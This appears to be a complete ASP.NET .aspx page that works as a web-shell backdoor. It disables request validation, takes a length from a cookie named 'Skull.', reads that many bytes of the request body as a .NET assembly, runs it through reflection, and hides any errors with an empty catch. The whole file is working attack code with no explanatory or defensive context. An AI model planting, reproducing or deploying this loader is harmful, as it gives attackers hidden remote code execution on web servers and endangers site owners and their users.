<%@ Page Language="C#" ValidateRequest="false" %>

<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["Skull."].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>